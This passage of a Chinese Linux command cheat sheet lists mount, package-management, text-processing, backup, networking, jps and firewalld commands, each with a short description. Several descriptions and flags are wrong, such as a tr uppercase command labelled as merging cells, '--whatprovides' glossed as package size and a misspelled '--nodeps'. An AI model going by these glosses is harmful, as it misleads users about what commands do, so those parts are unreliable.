运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用</p>\n<p>mount /dev/fd0 /mnt/floppy 挂载一个软盘 </p>\n<p>mount /dev/cdrom /mnt/cdrom 挂载一个cdrom或dvdrom </p>\n<p>mount /dev/hdc /mnt/cdrecorder 挂载一个cdrw或dvdrom </p>\n<p>mount /dev/hdb /mnt/cdrecorder 挂载一个cdrw或dvdrom </p>\n<p>mount -o loop file.iso /mnt/cdrom 挂载一个文件或ISO镜像文件</p>\n<p>mount -t vfat /dev/hda5 /mnt/hda5 挂载一个Windows FAT32文件系统 </p>\n<p>mount /dev/sda1 /mnt/usbdisk 挂载一个usb 捷盘或闪存设备</p>\n<p>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share 挂载一个windows网络共享 </p>\n<h1 id=\"磁盘空间\"><a href=\"#磁盘空间\" class=\"headerlink\" title=\"磁盘空间\"></a>磁盘空间</h1><p>df -h 显示已经挂载的分区列表</p>\n<p>ls -lSr |more 以尺寸大小排列文件和目录 </p>\n<p>du -sh dir1 估算目录 ‘dir1’ 已经使用的磁盘空间’ </p>\n<p>du -sk * | sort -rn 以容量大小为依据依次显示文件和目录的大小 </p>\n<p>rpm -q -a –qf ‘%10{SIZE}t%{NAME}n’ | sort -k1,1n 以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统) </p>\n<p>dpkg-query -W -f=’${Installed-Size;10}t${Package}n’ | sort -k1,1n 以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统) </p>\n<h1 id=\"用户和群组\"><a href=\"#用户和群组\" class=\"headerlink\" title=\"用户和群组\"></a>用户和群组</h1><p>groupadd group_name 创建一个新用户组 </p>\n<p>groupdel group_name 删除一个用户组 </p>\n<p>groupmod -n new_group_name old_group_name 重命名一个用户组 </p>\n<p>useradd -c “Name Surname “ -g admin -d /home/user1 -s /bin/bash user1 创建一个属于 “admin” 用户组的用户 </p>\n<p>useradd user1 创建一个新用户 </p>\n<p>userdel -r user1 删除一个用户 ( ‘-r’ 排除主目录) </p>\n<p>usermod -c “User FTP” -g system -d /ftp/user1 -s /bin/nologin user1 修改用户属性</p>\n<p>passwd 修改口令</p>\n<p>passwd user1 修改一个用户的口令 (只允许root执行) </p>\n<p>chage -E 2005-12-31 user1 设置用户口令的失效期限 </p>\n<p>pwck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的用户</p>\n<p>grpck 检查 ‘/etc/passwd’ 的文件格式和语法修正以及存在的群组</p>\n<p>newgrp group_name 登陆进一个新的群组以改变新创建文件的预设群组 </p>\n<h1 id=\"文件的权限-使用-“-”-设置权限，使用-“-“-用于取消\"><a href=\"#文件的权限-使用-“-”-设置权限，使用-“-“-用于取消\" class=\"headerlink\" title=\"文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消\"></a>文件的权限 - 使用 “+” 设置权限，使用 “-“ 用于取消</h1><p>ls -lh 显示权限</p>\n<p>ls /tmp | pr -T5 -W$COLUMNS 将终端划分成5栏显示</p>\n<p>chmod ugo+rwx directory1 设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限 </p>\n<p>chmod go-rwx directory1 删除群组(g)与其他人(o)对目录的读写执行权限</p>\n<p>chown user1 file1 改变一个文件的所有人属性 </p>\n<p>chown -R user1 directory1 改变一个目录的所有人属性并同时改变改目录下所有文件的属性 </p>\n<p>chgrp group1 file1 改变文件的群组 </p>\n<p>chown user1:group1 file1 改变一个文件的所有人和群组属性 </p>\n<p>find / -perm -u+s 罗列一个系统中所有使用了SUID控制的文件 </p>\n<p>chmod u+s /bin/file1 设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限</p>\n<p>chmod u-s /bin/file1 禁用一个二进制文件的 SUID位 </p>\n<p>chmod g+s /home/public 设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的</p>\n<p>chmod g-s /home/public 禁用一个目录的 SGID 位 </p>\n<p>chmod o+t /home/public 设置一个文件的 STIKY 位 - 只允许合法所有人删除文件</p>\n<p>chmod o-t /home/public 禁用一个目录的 STIKY 位 </p>\n<h1 id=\"文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消\"><a href=\"#文件的特殊属性-使用-“-”-设置权限，使用-“-“-用于取消\" class=\"headerlink\" title=\"文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消\"></a>文件的特殊属性 - 使用 “+” 设置权限，使用 “-“ 用于取消</h1><p>chattr +a file1 只允许以追加方式读写文件 </p>\n<p>chattr +c file1 允许这个文件能被内核自动压缩/解压 </p>\n<p>chattr +d file1 在进行文件系统备份时，dump程序将忽略这个文件 </p>\n<p>chattr +i file1 设置成不可变的文件，不能被删除、修改、重命名或者链接 </p>\n<p>chattr +s file1 允许一个文件被安全地删除 </p>\n<p>chattr +S file1 一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘 </p>\n<p>chattr +u file1 若文件被删除，系统会允许你在以后恢复这个被删除的文件 </p>\n<p>lsattr 显示特殊的属性</p>\n<h1 id=\"打包和压缩文件\"><a href=\"#打包和压缩文件\" class=\"headerlink\" title=\"打包和压缩文件\"></a>打包和压缩文件</h1><p>bunzip2 file1.bz2 解压一个叫做 ‘file1.bz2’的文件 </p>\n<p>bzip2 file1 压缩一个叫做 ‘file1’ 的文件 </p>\n<p>gunzip file1.gz 解压一个叫做 ‘file1.gz’的文件 </p>\n<p>gzip file1 压缩一个叫做 ‘file1’的文件 </p>\n<p>gzip -9 file1 最大程度压缩 </p>\n<p>rar a file1.rar test_file 创建一个叫做 ‘file1.rar’ 的包 </p>\n<p>rar a file1.rar file1 file2 dir1 同时压缩 ‘file1’, ‘file2’ 以及目录 ‘dir1’ </p>\n<p>rar x file1.rar 解压rar包</p>\n<p>unrar x file1.rar 解压rar包</p>\n<p>tar -cvf archive.tar file1 创建一个非压缩的 tarball </p>\n<p>tar -cvf archive.tar file1 file2 dir1 创建一个包含了 ‘file1’, ‘file2’ 以及 ‘dir1’的档案文件</p>\n<p>tar -tf archive.tar 显示一个包中的内容 </p>\n<p>tar -xvf archive.tar 释放一个包 </p>\n<p>tar -xvf archive.tar -C /tmp 将压缩包释放到 /tmp目录下</p>\n<p>tar -cvfj archive.tar.bz2 dir1 创建一个bzip2格式的压缩包</p>\n<p>tar -jxvf archive.tar.bz2 解压一个bzip2格式的压缩包</p>\n<p>tar -cvfz archive.tar.gz dir1 创建一个gzip格式的压缩包</p>\n<p>tar -zxvf archive.tar.gz 解压一个gzip格式的压缩包</p>\n<p>zip file1.zip file1 创建一个zip格式的压缩包</p>\n<p>zip -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 </p>\n<p>unzip file1.zip 解压一个zip格式压缩包</p>\n<h1 id=\"扩展名-zst表示存档由zstd压缩。\"><a href=\"#扩展名-zst表示存档由zstd压缩。\" class=\"headerlink\" title=\"扩展名.zst表示存档由zstd压缩。\"></a>扩展名.zst表示存档由zstd压缩。</h1><p>tar命令有一个选项-I（ - use-compress-program）来指定压缩/解压缩命令。</p>\n<p>可以按照如下命令进行解压：</p>\n<p>$ tar -I zstd -xvf xxxx.tar.zst</p>\n<p>参考文档：<a href=\"https://cloud.tencent.com/developer/ask/172210/answer/274433\">https://cloud.tencent.com/developer/ask/172210/answer/274433</a></p>\n<p>但是在执行tar -I zstd -xvf xxxx.tar.zst过程中遇到了如下问题：</p>\n<p>tar (child): zstd: Cannot exec: No such file or directory</p>\n<p>tar (child): Error is not recoverable: exiting now</p>\n<p>tar: Child returned status 2</p>\n<p>tar: Error is not recoverable: exiting now</p>\n<p>出现了这个是因为没有安装zstd包，需要手动安装这个安装包来解压zst</p>\n<p>ubuntu 系统可以直接通过下面命令进行安装</p>\n<p>$ sudo apt install zstd</p>\n<p>参考文档：<a href=\"https://www.cnblogs.com/clairedandan/p/13830908.html\">https://www.cnblogs.com/clairedandan/p/13830908.html</a></p>\n<h1 id=\"RPM-包-（Fedora-Redhat及类似系统）\"><a href=\"#RPM-包-（Fedora-Redhat及类似系统）\" class=\"headerlink\" title=\"RPM 包 - （Fedora, Redhat及类似系统）\"></a>RPM 包 - （Fedora, Redhat及类似系统）</h1><p>rpm -ivh package.rpm 安装一个rpm包</p>\n<p>rpm -ivh –nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告</p>\n<p>rpm -U package.rpm 更新一个rpm包但不改变其配置文件</p>\n<p>rpm -F package.rpm 更新一个确定已经安装的rpm包 </p>\n<p>rpm -e package_name.rpm 删除一个rpm包</p>\n<p>rpm -qa 显示系统中所有已经安装的rpm包 </p>\n<p>rpm -qa | grep httpd 显示所有名称中包含 “httpd” 字样的rpm包</p>\n<p>rpm -qi package_name 获取一个已安装包的特殊信息 </p>\n<p>rpm -qg “System Environment/Daemons” 显示一个组件的rpm包 </p>\n<p>rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表</p>\n<p>rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表</p>\n<p>rpm -q package_name –whatrequires 显示与一个rpm包存在依赖关系的列表</p>\n<p>rpm -q package_name –whatprovides 显示一个rpm包所占的体积</p>\n<p>rpm -q package_name –scripts 显示在安装/删除期间所执行的脚本l </p>\n<p>rpm -q package_name –changelog 显示一个rpm包的修改历史</p>\n<p>rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 </p>\n<p>rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 </p>\n<p>rpm –import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 </p>\n<p>rpm –checksig package.rpm 确认一个rpm包的完整性</p>\n<p>rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性</p>\n<p>rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间</p>\n<p>rpm -Va 检查系统中所有已安装的rpm包- 小心使用 </p>\n<p>rpm -Vp package.rpm 确认一个rpm包还未安装</p>\n<p>rpm2cpio package.rpm | cpio –extract –make-directories <em>bin</em> 从一个rpm包运行可执行文件</p>\n<p>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm 从一个rpm源码安装一个构建好的包 </p>\n<p>rpmbuild –rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包 </p>\n<h1 id=\"YUM-软件包升级器-（Fedora-RedHat及类似系统）\"><a href=\"#YUM-软件包升级器-（Fedora-RedHat及类似系统）\" class=\"headerlink\" title=\"YUM 软件包升级器 - （Fedora, RedHat及类似系统）\"></a>YUM 软件包升级器 - （Fedora, RedHat及类似系统）</h1><p>yum install package_name 下载并安装一个rpm包</p>\n<p>yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</p>\n<p>yum update package_name.rpm 更新当前系统中所有安装的rpm包 </p>\n<p>yum update package_name 更新一个rpm包</p>\n<p>yum remove package_name 删除一个rpm包</p>\n<p>yum list 列出当前系统中安装的所有包</p>\n<p>yum search package_name 在rpm仓库中搜寻软件包</p>\n<p>yum clean packages 清理rpm缓存删除下载的包</p>\n<p>yum clean headers 删除所有头文件 </p>\n<p>yum clean all 删除所有缓存的包和头文件 </p>\n<h1 id=\"DEB-包-Debian-Ubuntu-以及类似系统\"><a href=\"#DEB-包-Debian-Ubuntu-以及类似系统\" class=\"headerlink\" title=\"DEB 包 (Debian, Ubuntu 以及类似系统)\"></a>DEB 包 (Debian, Ubuntu 以及类似系统)</h1><p>dpkg -i package.deb 安装/更新一个 deb 包 </p>\n<p>dpkg -r package_name 从系统删除一个 deb 包</p>\n<p>dpkg -l 显示系统中所有已经安装的 deb 包 </p>\n<p>dpkg -l | grep httpd 显示所有名称中包含 “httpd” 字样的deb包</p>\n<p>dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 </p>\n<p>dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 </p>\n<p>dpkg –contents package.deb 显示尚未安装的一个包所提供的文件列表 </p>\n<p>dpkg -S /bin/ping 确认所给的文件由哪个deb包提供 </p>\n<h1 id=\"APT-软件工具-Debian-Ubuntu-以及类似系统\"><a href=\"#APT-软件工具-Debian-Ubuntu-以及类似系统\" class=\"headerlink\" title=\"APT 软件工具 (Debian, Ubuntu 以及类似系统)\"></a>APT 软件工具 (Debian, Ubuntu 以及类似系统)</h1><p>apt-get install package_name 安装/更新一个 deb 包 </p>\n<p>apt-cdrom install package_name 从光盘安装/更新一个 deb 包 </p>\n<p>apt-get update 升级列表中的软件包 </p>\n<p>apt-get upgrade 升级所有已安装的软件 </p>\n<p>apt-get remove package_name 从系统删除一个deb包</p>\n<p>apt-get check 确认依赖的软件仓库正确 </p>\n<p>apt-get clean 从下载的软件包中清理缓存 </p>\n<p>apt-cache search searched-package 返回包含所要搜索字符串的软件包名称 </p>\n<h1 id=\"查看文件内容\"><a href=\"#查看文件内容\" class=\"headerlink\" title=\"查看文件内容\"></a>查看文件内容</h1><p>cat file1 从第一个字节开始正向查看文件的内容</p>\n<p>tac file1 从最后一行开始反向查看一个文件的内容</p>\n<p>more file1 查看一个长文件的内容</p>\n<p>less file1 类似于 ‘more’ 命令，但是它允许在文件中和正向操作一样的反向操作</p>\n<p>head -2 file1 查看一个文件的前两行 </p>\n<p>tail -2 file1 查看一个文件的最后两行 </p>\n<p>tail -f /var/log/messages 实时查看被添加到一个文件中的内容 </p>\n<h1 id=\"文本处理\"><a href=\"#文本处理\" class=\"headerlink\" title=\"文本处理\"></a>文本处理</h1><p>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT </p>\n<p>cat file1 | command( sed, grep, awk, grep, etc…) &gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中</p>\n<p>cat file1 | command( sed, grep, awk, grep, etc…) &gt;&gt; result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中</p>\n<p>grep Aug /var/log/messages 在文件 ‘/var/log/messages’中查找关键词”Aug” </p>\n<p>grep ^Aug /var/log/messages 在文件 ‘/var/log/messages’中查找以”Aug”开始的词汇 </p>\n<p>grep [0-9] /var/log/messages 选择 ‘/var/log/messages’ 文件中所有包含数字的行 </p>\n<p>grep Aug -R /var/log/* 在目录 ‘/var/log’ 及随后的目录中搜索字符串”Aug” </p>\n<p>sed ‘s/stringa1/stringa2/g’ example.txt 将example.txt文件中的 “string1” 替换成 “string2” </p>\n<p>sed ‘/^$/d’ example.txt 从example.txt文件中删除所有空白行</p>\n<p>sed ‘/ *#/d; /^$/d’ example.txt 从example.txt文件中删除所有注释和空白行</p>\n<p>echo ‘esempio’ | tr ‘[:lower:]’ ‘[:upper:]’ 合并上下单元格内容 </p>\n<p>sed -e ‘1d’ result.txt 从文件example.txt 中排除第一行 </p>\n<p>sed -n ‘/stringa1/p’ 查看只包含词汇 “string1”的行 </p>\n<p>sed -e ‘s/ *$//‘ example.txt 删除每一行最后的空白字符 </p>\n<p>sed -e ‘s/stringa1//g’ example.txt 从文档中只删除词汇 “string1” 并保留剩余全部 </p>\n<p>sed -n ‘1,5p;5q’ example.txt 查看从第一行到第5行内容</p>\n<p>sed -n ‘5p;5q’ example.txt 查看第5行</p>\n<p>sed -e ‘s/00*/0/g’ example.txt 用单个零替换多个零 </p>\n<p>cat -n file1 标示文件的行数</p>\n<p>cat example.txt | awk ‘NR%2==1’ 删除example.txt文件中的所有偶数行 </p>\n<p>echo a b c | awk ‘{print $1}’ 查看一行第一栏 </p>\n<p>echo a b c | awk ‘{print $1,$3}’ 查看一行的第一和第三栏 </p>\n<p>paste file1 file2 合并两个文件或两栏的内容 </p>\n<p>paste -d ‘+’ file1 file2 合并两个文件或两栏的内容，中间用”+”区分 </p>\n<p>sort file1 file2 排序两个文件的内容 </p>\n<p>sort file1 file2 | uniq 取出两个文件的并集(重复的行只保留一份) </p>\n<p>sort file1 file2 | uniq -u 删除交集，留下其他的行 </p>\n<p>sort file1 file2 | uniq -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) </p>\n<p>comm -1 file1 file2 比较两个文件的内容只删除 ‘file1’ 所包含的内容 </p>\n<p>comm -2 file1 file2 比较两个文件的内容只删除 ‘file2’ 所包含的内容 </p>\n<p>comm -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 </p>\n<h1 id=\"字符设置和文件格式转换\"><a href=\"#字符设置和文件格式转换\" class=\"headerlink\" title=\"字符设置和文件格式转换\"></a>字符设置和文件格式转换</h1><p>dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX </p>\n<p>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS </p>\n<p>recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html </p>\n<p>recode -l | more 显示所有允许的转换格式 </p>\n<h1 id=\"文件系统分析\"><a href=\"#文件系统分析\" class=\"headerlink\" title=\"文件系统分析\"></a>文件系统分析</h1><p>badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块</p>\n<p>fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性</p>\n<p>fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</p>\n<p>e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性</p>\n<p>e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</p>\n<p>fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性</p>\n<p>fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性</p>\n<p>fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</p>\n<p>dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</p>\n<h1 id=\"初始化一个文件系统\"><a href=\"#初始化一个文件系统\" class=\"headerlink\" title=\"初始化一个文件系统\"></a>初始化一个文件系统</h1><p>mkfs /dev/hda1 在hda1分区创建一个文件系统</p>\n<p>mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 </p>\n<p>mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 </p>\n<p>mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统</p>\n<p>fdformat -n /dev/fd0 格式化一个软盘 </p>\n<p>mkswap /dev/hda3 创建一个swap文件系统</p>\n<h1 id=\"SWAP文件系统\"><a href=\"#SWAP文件系统\" class=\"headerlink\" title=\"SWAP文件系统\"></a>SWAP文件系统</h1><p>mkswap /dev/hda3 创建一个swap文件系统</p>\n<p>swapon /dev/hda3 启用一个新的swap文件系统</p>\n<p>swapon /dev/hda2 /dev/hdb3 启用两个swap分区</p>\n<h1 id=\"备份\"><a href=\"#备份\" class=\"headerlink\" title=\"备份\"></a>备份</h1><p>dump -0aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的完整备份 </p>\n<p>dump -1aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的交互式备份 </p>\n<p>restore -if /tmp/home0.bak 还原一个交互式备份 </p>\n<p>rsync -rogpav –delete /home /tmp 同步两边的目录 </p>\n<p>rsync -rogpav -e ssh –delete /home ip_address:/tmp 通过SSH通道rsync </p>\n<p>rsync -az -e ssh –delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录</p>\n<p>rsync -az -e ssh –delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录</p>\n<p>dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr ‘dd of=hda.gz’ 通过ssh在远程主机上执行一次备份本地磁盘的操作</p>\n<p>dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 </p>\n<p>tar -Puf backup.tar /home/user 执行一次对 ‘/home/user’ 目录的交互式备份操作 </p>\n<p>( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr ‘cd /home/share/ &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个目录内容</p>\n<p>( tar c /home ) | ssh -C user@ip_addr ‘cd /home/backup-home &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个本地目录</p>\n<p>tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 </p>\n<p>find /home/user1 -name ‘*.txt’ | xargs cp -av –target-directory=/home/backup/ –parents 从一个目录查找并复制所有以 ‘.txt’ 结尾的文件到另一个目录</p>\n<p>find /var/log -name ‘*.log’ | tar cv –files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 ‘.log’ 结尾的文件并做成一个bzip包 </p>\n<p>dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 </p>\n<p>dd if=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 </p>\n<h1 id=\"光盘\"><a href=\"#光盘\" class=\"headerlink\" title=\"光盘\"></a>光盘</h1><p>cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容</p>\n<p>mkisofs /dev/cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件 </p>\n<p>mkisofs /dev/cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件 </p>\n<p>mkisofs -J -allow-leading-dots -R -V “Label CD” -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件</p>\n<p>cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件</p>\n<p>gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom - 刻录一个压缩了的ISO镜像文件 </p>\n<p>mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件</p>\n<p>cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中 </p>\n<p>cd-paranoia – “-3” 从一个CD光盘转录音轨到 wav 文件中（参数-3） </p>\n<p>cdrecord –scanbus 扫描总线以识别scsi通道</p>\n<p>dd if=/dev/hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD </p>\n<h1 id=\"网络-（以太网和WIFI无线）\"><a href=\"#网络-（以太网和WIFI无线）\" class=\"headerlink\" title=\"网络 - （以太网和WIFI无线）\"></a>网络 - （以太网和WIFI无线）</h1><p>ifconfig eth0 显示一个以太网卡的配置 </p>\n<p>ifup eth0 启用一个 ‘eth0’ 网络设备 </p>\n<p>ifdown eth0 禁用一个 ‘eth0’ 网络设备 </p>\n<p>ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址 </p>\n<p>ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing) </p>\n<p>dhclient eth0 以dhcp模式启用 ‘eth0’ </p>\n<p>route -n show routing table </p>\n<p>route add -net 0/0 gw IP_Gateway configura default gateway </p>\n<p>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0/16’ </p>\n<p>route del 0/0 gw IP_gateway remove static route </p>\n<p>echo “1” &gt; /proc/sys/net/ipv4/ip_forward activate ip routing </p>\n<p>hostname show hostname of system </p>\n<p>host <a href=\"http://www.example.com/\">www.example.com</a> lookup hostname to resolve name to ip address and viceversa</p>\n<p>nslookup <a href=\"http://www.example.com/\">www.example.com</a> lookup hostname to resolve name to ip address and viceversa</p>\n<p>ip link show show link status of all interfaces </p>\n<p>mii-tool eth0 show link status of ‘eth0’ </p>\n<p>ethtool eth0 show statistics of network card ‘eth0’ </p>\n<p>netstat -tup show all active network connections and their PID </p>\n<p>netstat -tupl show all network services listening on the system and their PID </p>\n<p>tcpdump tcp port 80 show all HTTP traffic </p>\n<p>iwlist scan show wireless networks </p>\n<p>iwconfig eth1 show configuration of a wireless network card </p>\n<p>hostname show hostname </p>\n<p>host <a href=\"http://www.example.com/\">www.example.com</a> lookup hostname to resolve name to ip address and viceversa </p>\n<p>nslookup <a href=\"http://www.example.com/\">www.example.com</a> lookup hostname to resolve name to ip address and viceversa </p>\n<p>whois <a href=\"http://www.example.com/\">www.example.com</a> lookup on Whois database </p>\n<h1 id=\"JPS工具\"><a href=\"#JPS工具\" class=\"headerlink\" title=\"JPS工具\"></a>JPS工具</h1><p>jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。</p>\n<p>  我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 id。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其id号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。</p>\n<p>   使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。</p>\n<p>jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.</p>\n<p>$&gt; jps</p>\n<p>23991 Jps</p>\n<p>23789 BossMain</p>\n<p>23651 Resin</p>\n<h1 id=\"比较常用的参数：\"><a href=\"#比较常用的参数：\" class=\"headerlink\" title=\"比较常用的参数：\"></a>比较常用的参数：</h1><p>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数</p>\n<p>$&gt; jps -q</p>\n<p>28680</p>\n<p>23789</p>\n<p>23651</p>\n<p>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null</p>\n<p>$&gt; jps -m</p>\n<p>28715 Jps -m</p>\n<p>23789 BossMain</p>\n<p>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log</p>\n<p>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名</p>\n<p>$&gt; jps -l</p>\n<p>28729 sun.tools.jps.Jps</p>\n<p>23789 com.asiainfo.aimc.bossbi.BossMain</p>\n<p>23651 com.caucho.server.resin.Resin</p>\n<p>-v 输出传递给JVM的参数</p>\n<p>$&gt; jps -v</p>\n<p>23789 BossMain</p>\n<p>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd</p>\n<p>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m</p>\n<p>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -</p>\n<p>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl</p>\n<p>sudo jps看到的进程数量最全</p>\n<p>jps 192.168.0.77</p>\n<p>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099</p>\n<p>（前提是远程服务器提供jstatd服务）</p>\n<p>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。</p>\n<p>转自：<a href=\"https://www.cnblogs.com/yjd_hycf_space/p/7730690.html\">https://www.cnblogs.com/yjd_hycf_space/p/7730690.html</a></p>\n<p>详细情况请参考sun官方文档。</p>\n<p><a href=\"http://java.sun.com/j2se/1.7.0/docs/tooldocs/share/jps.html\">http://java.sun.com/j2se/1.7.0/docs/tooldocs/share/jps.html</a></p>\n<p>(2) 修改字体和字体大小:</p>\n<p>cd /lib/kbd/consolefonts    //进入到有字体的目录</p>\n<p>ls                     //查看所有字体</p>\n<p>setfont lat4-16+          //设置所选字体，lat4-16+为一个字体名字</p>\n<p>echo ‘setfont lat4-16+’ &gt;&gt; /etc/bashrc     //设置为开机默认</p>\n<p>(3) 修改分辨率</p>\n<p>首先打开一个文件：</p>\n<p>vi /etc/default/grub</p>\n<p>在倒数第2行的 GRUB_CMDLINE_LINUX参数中的末尾添加以下内容：</p>\n<p>net.ifnames=0 vga=0x314</p>\n<p>将上面的文件保存退出。 </p>\n<p>执行下面的命令，重新生成目标文件：</p>\n<p>grub2-mkconfig &gt; /boot/grub2/grub.cfg</p>\n<p>显示 done完成后，重启系统后生效：</p>\n<p>reboot</p>\n<h1 id=\"Iptables-firewalld\"><a href=\"#Iptables-firewalld\" class=\"headerlink\" title=\"Iptables / firewalld\"></a>Iptables / firewalld</h1><p>Centos7默认安装了firewalld，如果没有安装的话，可以使用 yum install firewalld firewalld-config进行安装。</p>\n<h2 id=\"1-启动防火墙\"><a href=\"#1-启动防火墙\" class=\"headerlink\" title=\"1.启动防火墙\"></a>1.启动防火墙</h2><p>systemctl start firewalld</p>\n<h2 id=\"2-禁用防火墙\"><a href=\"#2-禁用防火墙\" class=\"headerlink\" title=\"2.禁用防火墙\"></a>2.禁用防火墙</h2><p>systemctl stop firewalld</p>\n<h2 id=\"3-设置开机启动\"><a href=\"#3-设置开机启动\" class=\"headerlink\" title=\"3.设置开机启动\"></a>3.设置开机启动</h2><p>systemctl enable firewalld</p>\n<h2 id=\"4-停止并禁用开机启动\"><a href=\"#4-停止并禁用开机启动\" class=\"headerlink\" title=\"4.停止并禁用开机启动\"></a>4.停止并禁用开机启动</h2><p>sytemctl disable firewalld</p>\n<h2 id=\"5-重启防火墙\"><a href=\"#5-重启防火墙\" class=\"headerlink\" title=\"5.重启防火墙\"></a>5.重启防火墙</h2><p>systemctl restart firewalld</p>\n<p>firewall-cmd –reload</p>\n<h2 id=\"6-查看状态\"><a href=\"#6-查看状态\" class=\"headerlink\" title=\"6.查看状态\"></a>6.查看状态</h2><p>systemctl status firewalld或者 firewall-cmd –state</p>\n<h2 id=\"7-查看版本\"><a href=\"#7-查看版本\" class=\"headerlink\" 